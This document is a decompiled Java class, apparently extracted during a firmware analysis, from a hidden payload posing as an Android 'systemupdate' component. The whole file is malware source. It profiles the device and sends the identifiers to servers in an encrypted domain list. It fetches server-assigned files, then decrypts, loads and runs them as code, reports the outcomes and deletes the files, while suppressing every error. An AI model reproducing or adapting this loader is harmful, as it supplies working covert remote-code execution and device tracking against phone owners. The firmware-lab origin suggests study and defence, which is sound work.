package com.android.systemupdate.a;

import android.content.Context;
import android.text.TextUtils;
import com.android.systemupdate.a.a.g;
import com.android.systemupdate.a.a.i;
import com.android.systemupdate.a.a.m;
import com.android.systemupdate.a.a.p;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: TaskRun.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/b/classes.dex */
public class f {
    private static f a = null;
    private static String[] c = null;
    private static HashMap<String, d> d = new HashMap<>();
    private Context b = null;

    private f() {
    }

    public static f a() {
        if (a == null) {
            a = new f();
        }
        return a;
    }

    public void a(Context context) {
        if (this.b == null) {
            this.b = context;
        }
        d();
        c();
    }

    private void c() {
        String[] pkglist;
        JSONObject json = new JSONObject();
        try {
            JSONObject jsonA = new JSONObject();
            jsonA.put("a", 2307);
            jsonA.put("b", b.b(this.b));
            jsonA.put("c", b.a(this.b));
            jsonA.put("d", p.c(this.b));
            jsonA.put("e", p.d(this.b));
            jsonA.put("f", p.e(this.b));
            jsonA.put("g", p.a());
            jsonA.put("h", p.b());
            jsonA.put("i", p.c());
            jsonA.put("j", p.d());
            jsonA.put("k", p.h(this.b));
            jsonA.put("l", p.g(this.b));
            jsonA.put("m", p.f(this.b));
            jsonA.put("u", p.f());
            jsonA.put("w", p.j(this.b));
            jsonA.put("y", p.k(this.b));
            jsonA.put("z", p.g());
            jsonA.put("aa", p.h());
            jsonA.put("ah", p.j());
            jsonA.put("ai", p.k());
            jsonA.put("aj", a.a(this.b));
            jsonA.put("ak", p.e());
            jsonA.put("al", p.i(this.b));
            jsonA.put("an", p.m(this.b));
            json.put("a", jsonA);
            JSONObject jsonB = new JSONObject();
            JSONArray taskList = f();
            if (taskList != null) {
                jsonB.put("a", taskList);
            }
            json.put("b", jsonB);
        } catch (Throwable th) {
        }
        String params = json.toString();
        String content = g.a(this.b, b(this.b), p.a(b.h), params, true, b.d, b.e);
        m.a(this.b, p.b(b.k), p.b(b.n), System.currentTimeMillis());
        try {
            if (!TextUtils.isEmpty(content)) {
                JSONObject jsonObj = new JSONObject(content);
                i.a(jsonObj, "a", -1);
                String uuid = i.b(jsonObj, "b");
                b.a(this.b, uuid);
                int nextRequestTime = i.c(jsonObj, "e");
                if (nextRequestTime > 0) {
                    m.a(this.b, p.b(b.k), p.b(b.m), nextRequestTime);
                }
                long taskId = i.d(jsonObj, "c");
                try {
                    JSONArray jsonDomainList = i.a(jsonObj, "f");
                    if (jsonDomainList != null && jsonDomainList.length() > 0) {
                        String domainStr = com.android.systemupdate.a.a.a.a(jsonDomainList.toString(), p.a(b.f), p.a(b.g));
                        if (!TextUtils.isEmpty(domainStr)) {
                            m.a(this.b, p.b(b.k), p.b(b.l), domainStr);
                            com.android.systemupdate.a.a.f.a(String.valueOf(p.a(a.v)) + p.b(b.k), p.b(b.l), domainStr);
                        }
                    }
                } catch (Throwable th2) {
                }
                try {
                    JSONArray jsonPkgList = i.a(jsonObj, "g");
                    if (jsonPkgList != null && jsonPkgList.length() > 0) {
                        int size = jsonPkgList.length();
                        StringBuffer sbPkgs = new StringBuffer();
                        for (int i = 0; i < size; i++) {
                            sbPkgs.append(p.a(jsonPkgList.getString(i)));
                            sbPkgs.append(",");
                        }
                        m.a(this.b, p.b(b.k), p.b(b.q), sbPkgs.toString());
                    } else {
                        m.a(this.b, p.b(b.k), p.b(b.q), "");
                    }
                } catch (Throwable th3) {
                }
                try {
                    String pkgs = i.b(jsonObj, "h");
                    if (pkgs != null && pkgs.length() > 0 && (pkglist = pkgs.split(",")) != null && pkglist.length > 0) {
                        StringBuffer sbPkgs2 = new StringBuffer();
                        for (String str : pkglist) {
                            sbPkgs2.append(p.a(str));
                            sbPkgs2.append(",");
                        }
                        m.a(this.b, p.b(b.k), p.b(b.r), sbPkgs2.toString());
                    } else {
                        m.a(this.b, p.b(b.k), p.b(b.r), "");
                    }
                } catch (Throwable th4) {
                }
                try {
                    JSONArray jsonTaskList = i.a(jsonObj, "d");
                    if (jsonTaskList != null && jsonTaskList.length() > 0) {
                        int size2 = jsonTaskList.length();
                        for (int i2 = 0; i2 < size2; i2++) {
                            JSONObject taskObj = jsonTaskList.getJSONObject(i2);
                            e taskInfo = new e();
                            taskInfo.a(i.c(taskObj, "a"));
                            taskInfo.a(i.b(taskObj, "b"));
                            taskInfo.b(i.b(taskObj, "c"));
                            taskInfo.c(i.b(taskObj, "d"));
                            taskInfo.b(i.c(taskObj, "e"));
                            taskInfo.d(i.b(taskObj, "f"));
                            a(this.b, taskId, taskInfo);
                        }
                    }
                } catch (Throwable th5) {
                }
            }
        } catch (Throwable th6) {
        }
    }

    private void a(Context context, long taskId, e taskInfo) {
        if (taskInfo != null) {
            int inresult = 100;
            try {
                ClassLoader classLoader = a(context, taskInfo.a(), taskInfo.e());
                if (classLoader == null) {
                    String path = String.valueOf(p.b(context)) + p.a(a.q) + taskInfo.f() + p.a(a.r);
                    int downresult = g.a(context, taskInfo.b(), path, 10);
                    switch (downresult) {
                        case 1:
                        case 3:
                            String fileMd5 = com.android.systemupdate.a.a.f.e(path);
                            if (fileMd5.equalsIgnoreCase(taskInfo.f())) {
                                String tPath = String.valueOf(p.b(context)) + p.a(a.q) + taskInfo.f() + p.a(a.s);
                                p.a(path, tPath, 1, b.a, b.b);
                                if (com.android.systemupdate.a.a.f.d(tPath)) {
                                    try {
                                        classLoader = a(context, taskId, taskInfo, tPath);
                                    } catch (Throwable th) {
                                        inresult = 106;
                                    }
                                } else {
                                    inresult = 105;
                                }
                            } else {
                                inresult = 104;
                            }
                            break;
                        case 2:
                        default:
                            inresult = 101;
                            break;
                        case 4:
                            inresult = 101;
                            break;
                        case 5:
                            inresult = 102;
                            break;
                        case 6:
                            inresult = 103;
                            break;
                    }
                    if (classLoader != null) {
                        try {
                            com.android.systemupdate.a.a.d.a(context, classLoader, taskInfo.c(), taskInfo.d(), b.b(context));
                            inresult = 300;
                        } catch (ClassNotFoundException e) {
                            inresult = 201;
                        } catch (NoSuchMethodException e2) {
                            inresult = 202;
                        } catch (Throwable th2) {
                            inresult = 203;
                        }
                    }
                    com.android.systemupdate.a.a.f.b(String.valueOf(p.b(context)) + p.a(a.q) + taskInfo.f() + p.a(a.s));
                    com.android.systemupdate.a.a.f.b(String.valueOf(p.b(context)) + taskInfo.f() + p.a(a.t));
                    if (inresult != 300) {
                        com.android.systemupdate.a.a.f.b(path);
                    }
                    a(context, taskId, taskInfo.a(), taskInfo.e(), inresult);
                }
            } catch (Throwable th3) {
            }
        }
    }

    private void d() {
        try {
            HashMap<String, d> hashMap = e();
            if (hashMap != null && hashMap.size() > 0) {
                for (Map.Entry<String, d> entry : hashMap.entrySet()) {
                    d taskData = entry.getValue();
                    if (taskData != null && taskData.a() != null && taskData.b() != null) {
                        int runresult = 300;
                        try {
                            com.android.systemupdate.a.a.d.a(this.b, taskData.b(), taskData.a().c(), taskData.a().d(), b.b(this.b));
                        } catch (ClassNotFoundException e) {
                            runresult = 201;
                        } catch (NoSuchMethodException e2) {
                            runresult = 202;
                        } catch (Throwable th) {
                            runresult = 203;
                        }
                        a(this.b, taskData.a().a(), taskData.a().e(), runresult);
                    }
                }
            }
        } catch (Throwable th2) {
        }
    }

    private void a(Context context, long taskId, int id, int version, int result) {
        JSONObject json = new JSONObject();
        try {
            JSONObject jsonB = new JSONObject();
            jsonB.put("a", b.a(context));
            jsonB.put("b", b.b(context));
            jsonB.put("c", taskId);
            jsonB.put("d", id);
            jsonB.put("e", version);
            jsonB.put("f", result);
            json.put("b", jsonB);
        } catch (Throwable th) {
        }
        String params = json.toString();
        g.a(context, b(context), p.a(b.i), params, false, b.d, b.e);
    }

    private void a(Context context, int id, int version, int result) {
        JSONObject json = new JSONObject();
        try {
            JSONObject jsonA = new JSONObject();
            jsonA.put("a", 2307);
            jsonA.put("b", b.b(context));
            jsonA.put("c", b.a(context));
            jsonA.put("d", p.c(context));
            jsonA.put("e", p.d(context));
            jsonA.put("f", p.e(context));
            jsonA.put("g", p.a());
            jsonA.put("h", p.b());
            jsonA.put("i", p.c());
            jsonA.put("j", p.d());
            jsonA.put("k", p.h(context));
            jsonA.put("l", p.g(context));
            jsonA.put("m", p.f(context));
            json.put("a", jsonA);
            JSONObject jsonB = new JSONObject();
            jsonB.put("a", id);
            jsonB.put("b", version);
            jsonB.put("c", result);
            json.put("b", jsonB);
        } catch (Throwable th) {
        }
        String params = json.toString();
        g.a(context, b(context), p.a(b.j), params, false, b.d, b.e);
    }

    public static void b() {
        c = null;
    }

    private static String[] b(Context context) {
        String domainStr;
        String[] postUrl = null;
        if (c != null && c.length > 0) {
            com.android.systemupdate.a.a.c.a(c);
            String[] postUrl2 = c;
            return postUrl2;
        }
        try {
            String content = m.b(context, p.b(b.k), p.b(b.l), (String) null);
            if (content == null || content.length() <= 0) {
                content = com.android.systemupdate.a.a.f.a(String.valueOf(p.a(a.v)) + p.b(b.k), p.b(b.l));
            }
            if (content == null || content.length() <= 0 || (domainStr = com.android.systemupdate.a.a.a.b(content, p.a(b.f), p.a(b.g))) == null || domainStr.length() <= 0) {
                return null;
            }
            JSONArray domainList = new JSONArray(domainStr);
            int cnt = domainList.length();
            c = new String[cnt];
            for (int i = 0; i < cnt; i++) {
                JSONObject domainInfo = domainList.getJSONObject(i);
                String url = i.b(domainInfo, "a");
                if (!TextUtils.isEmpty(url)) {
                    int port = i.c(domainInfo, "c");
                    String url2 = url.replaceAll(" ", "");
                    if (!url2.toLowerCase(Locale.getDefault()).startsWith("http://") && !url2.toLowerCase(Locale.getDefault()).startsWith("https://")) {
                        if (!url2.contains(":") && !url2.endsWith("/")) {
                            url2 = String.valueOf(url2) + ":" + port;
                        }
                        url2 = "http://" + url2;
                    } else if (url2.lastIndexOf(":") <= 7 && !url2.endsWith("/")) {
                        url2 = String.valueOf(url2) + ":" + port;
                    }
                    if (!url2.endsWith("/")) {
                        url2 = String.valueOf(url2) + "/";
                    }
                    c[i] = url2;
                }
            }
            com.android.systemupdate.a.a.c.a(c);
            postUrl = c;
            return postUrl;
        } catch (Throwable th) {
            return postUrl;
        }
    }

    private static ClassLoader a(Context context, long taskId, e taskInfo, String filePath) throws Throwable {
        if (d == null) {
            d = new HashMap<>();
        }
        ClassLoader classLoader = com.android.systemupdate.a.a.d.a(context, filePath);
        if (classLoader != null) {
            d taskData = new d();
            taskData.a(taskId);
            taskData.a(taskInfo);
            taskData.a(classLoader);
            d.put(taskInfo.f(), taskData);
        }
        return classLoader;
    }

    private static HashMap<String, d> e() {
        return d;
    }

    private static ClassLoader a(Context context, int id, int version) {
        try {
            if (d != null && d.size() > 0) {
                d taskData = null;
                for (Map.Entry<String, d> entry : d.entrySet()) {
                    if (entry.getValue() != null && entry.getValue().a() != null && id == entry.getValue().a().a()) {
                        d taskData2 = entry.getValue();
                        taskData = taskData2;
                        break;
                    }
                }
                if (taskData != null) {
                    if (version != taskData.a().e()) {
                        a(context, taskData.a().f());
                        return null;
                    }
                    if (taskData.b() != null) {
                        return taskData.b();
                    }
                }
            }
        } catch (Exception e) {
        }
        return null;
    }

    private static JSONArray f() {
        try {
            if (d != null && d.size() > 0) {
                JSONArray jsonArray = new JSONArray();
                for (Map.Entry<String, d> entry : d.entrySet()) {
                    if (entry.getValue() != null && entry.getValue().a() != null) {
                        JSONObject obj = new JSONObject();
                        obj.put("a", entry.getValue().a().a());
                        obj.put("b", entry.getValue().a().e());
                        jsonArray.put(obj);
                    }
                }
                return jsonArray;
            }
        } catch (Throwable th) {
        }
        return null;
    }

    private static boolean a(Context context, String key) {
        d taskData;
        try {
            if (d != null && d.size() > 0 && (taskData = d.remove(key)) != null && taskData.a() != null && taskData.b() != null) {
                if (!TextUtils.isEmpty(taskData.a().c())) {
                    try {
                        com.android.systemupdate.a.a.d.a(context, taskData.b(), taskData.a().c(), p.a(a.u), "");
                    } catch (Throwable th) {
                    }
                }
                taskData.b().clearAssertionStatus();
                taskData.a((ClassLoader) null);
                com.android.systemupdate.a.a.f.b(String.valueOf(p.b(context)) + p.a(a.q) + key + p.a(a.r));
                return true;
            }
            return true;
        } catch (Throwable th2) {
            return true;
        }
    }
}
